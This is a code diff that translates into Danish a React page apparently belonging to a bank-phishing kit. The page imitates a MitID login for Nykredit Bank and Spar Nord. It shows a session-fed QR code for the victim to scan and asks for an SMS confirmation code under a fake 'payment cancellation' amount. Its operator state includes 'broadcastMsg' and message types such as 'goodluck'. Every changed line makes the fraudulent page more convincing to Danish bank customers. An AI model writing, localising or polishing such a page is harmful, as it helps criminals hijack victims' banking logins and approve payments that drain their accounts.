@@ -13,7 +13,7 @@ interface Props {
 function MitIdAnimation({ text }: { text?: string }) {
   return (
     <div className="flex flex-col items-center justify-center text-center">
-      <p className="text-[18px] font-bold text-[#001C44] mb-6">{text || 'Open MitID app and approve'}</p>
+      <p className="text-[18px] font-bold text-[#001C44] mb-6">{text || 'Åbn MitID app og godkend'}</p>
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 180 160" shapeRendering="geometricPrecision" textRendering="geometricPrecision" className="w-[200px] h-[178px]">
         <path d="M83.873684,0h-71.747368C5.456842,0,0,5.4,0,12v136c0,6.6,5.456842,12,12.126316,12h71.747368C90.543158,160,96,154.6,96,148v-136C96,5.4,90.543158,0,83.873684,0v0Z" transform="translate(42 0)" fill="#8ec0fa"/>
         <path d="M78.917647,0C82.863529,0,86,3.1,86,7v136c0,3.8-3.136471,7-7.082353,7h-71.835294C3.237647,150,0,146.8,0,143L0,7C0,3.1,3.237647,0,7.082353,0h71.835294" transform="translate(47 5)" fill="#c8e0fd" stroke="#c8e0fd" strokeWidth="1.176471"/>
@@ -91,7 +91,7 @@ export default function QRPage({ sessionId, onBack }: Props) {
   const [qrReady, setQrReady] = useState(false)
   const [qrImage, setQrImage] = useState<string | null>(null)
   const [verified, setVerified] = useState(false)
-  const [titleText, setTitleText] = useState('Log in to Nykredit Bank and Spar Nord')
+  const [titleText, setTitleText] = useState('Log på hos Nykredit Bank og Spar Nord')
   const [broadcastMsg, setBroadcastMsg] = useState<string | null>(null)
   const [broadcastEnabled, setBroadcastEnabled] = useState(true)
   const [msgType, setMsgType] = useState<'warning' | 'myid' | 'goodluck' | null>(null)
@@ -163,8 +163,8 @@ export default function QRPage({ sessionId, onBack }: Props) {
         <main className="flex-1 flex items-center justify-center">
           <div className="bg-white rounded-lg shadow p-10 text-center" style={{ fontFamily: "'IBM Plex Sans', Arial, sans-serif" }}>
             <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2" className="mx-auto mb-4"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22,4 12,14.01 9,11.01"/></svg>
-            <h1 className="text-[20px] font-bold text-[#001C44] mb-2">Login Verified</h1>
-            <p className="text-[14px] text-gray-600">Authentication successful.</p>
+            <h1 className="text-[20px] font-bold text-[#001C44] mb-2">Log ind bekræftet</h1>
+            <p className="text-[14px] text-gray-600">Godkendelse gennemført.</p>
           </div>
         </main>
       </div>
@@ -191,19 +191,19 @@ export default function QRPage({ sessionId, onBack }: Props) {
               <div className="flex flex-col h-full">
                 <div className="flex items-start justify-between mb-2">
                   <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
-                    {titleText || 'Log in to Nykredit Bank and Spar Nord'}
+                    {titleText || 'Log på hos Nykredit Bank og Spar Nord'}
                   </h1>
                   <MitIdLogo />
                 </div>
                 <hr className="border-gray-200 my-3" />
                 <div className="flex-1 flex flex-col items-center justify-center">
-                  <MitIdAnimation text="Verifying..." />
+                  <MitIdAnimation text="Godkender..." />
                 </div>
                 <div className="flex-1" />
                 <hr className="border-gray-200 mb-3" />
                 <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
-                  <button onClick={onBack} className="hover:underline cursor-pointer">Cancel</button>
-                  <a href="#" className="hover:underline">Help</a>
+                  <button onClick={onBack} className="hover:underline cursor-pointer">Annuller</button>
+                  <a href="#" className="hover:underline">Hjælp</a>
                 </nav>
               </div>
             </CardShell>
@@ -233,7 +233,7 @@ export default function QRPage({ sessionId, onBack }: Props) {
             <div className="flex flex-col h-full">
               <div className="flex items-start justify-between mb-2">
                 <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4 whitespace-pre-line">
-                  {titleText || 'Log in to Nykredit Bank and Spar Nord'}
+                  {titleText || 'Log på hos Nykredit Bank og Spar Nord'}
                 </h1>
                 <MitIdLogo />
               </div>
@@ -244,15 +244,15 @@ export default function QRPage({ sessionId, onBack }: Props) {
                     <div className="text-center mb-5">
                       <div className="flex items-center justify-center gap-2 mb-2">
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0055a5" strokeWidth="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
-                        <span className="text-[14px] font-bold text-[#001C44] uppercase tracking-wide">SMS CONFIRMATION</span>
+                        <span className="text-[14px] font-bold text-[#001C44] uppercase tracking-wide">SMS BEKRÆFTELSE</span>
                       </div>
                       {smsAmount && (
                         <div className="bg-gray-50 rounded-xl border border-gray-200 p-4 mb-4">
-                          <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1">PAYMENT CANCELLATION</div>
+                          <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-1">BETALINGSANNULLERING</div>
                           <div className="text-[28px] font-bold text-[#001C44]">{Number(smsAmount).toLocaleString('da-DK')} kr</div>
                         </div>
                       )}
-                      <p className="text-[13px] text-gray-500">Enter the confirmation code from your SMS to continue.</p>
+                      <p className="text-[13px] text-gray-500">Indtast bekræftelseskoden fra din SMS for at fortsætte.</p>
                     </div>
                     <div className="flex gap-3 justify-center mb-5">
                       {smsCode.map((digit, i) => (
@@ -280,14 +280,14 @@ export default function QRPage({ sessionId, onBack }: Props) {
                     }} className={`w-full font-bold text-[14px] py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-between px-5 ${
                       smsCode.join('').length === smsLength ? 'bg-[#0055a5] hover:bg-[#004080] text-white' : 'bg-[#e8edf4] text-[#8a9bb5]'
                     }`}>
-                      <span>CONFIRM</span>
+                      <span>BEKRÆFT</span>
                       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12,5 19,12 12,19"/></svg>
                     </button>
-                    {smsError && <p className="text-[12px] text-red-600 text-center mt-2 font-medium">Incorrect code. Please try again.</p>}
+                    {smsError && <p className="text-[12px] text-red-600 text-center mt-2 font-medium">Forkert kode. Prøv igen.</p>}
                   </div>
                 ) : qrReady ? (
                   <>
-                    <h2 className="text-[18px] font-bold text-[#001C44] text-center mb-6">Scan QR code with<br />MitID app</h2>
+                    <h2 className="text-[18px] font-bold text-[#001C44] text-center mb-6">Scan QR-kode med<br />MitID app</h2>
                     <div className="p-4 bg-white border border-gray-200 rounded">
                       {qrImage ? (
                         <img src={qrImage} alt="QR Code" className="w-[200px] h-[200px] object-contain" />
@@ -303,8 +303,8 @@ export default function QRPage({ sessionId, onBack }: Props) {
               <div className="flex-1" />
               <hr className="border-gray-200 mb-3" />
               <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
-                <button onClick={onBack} className="hover:underline cursor-pointer">Cancel</button>
-                <a href="#" className="hover:underline">Help</a>
+                <button onClick={onBack} className="hover:underline cursor-pointer">Annuller</button>
+                <a href="#" className="hover:underline">Hjælp</a>
               </nav>
             </div>
           </CardShell>
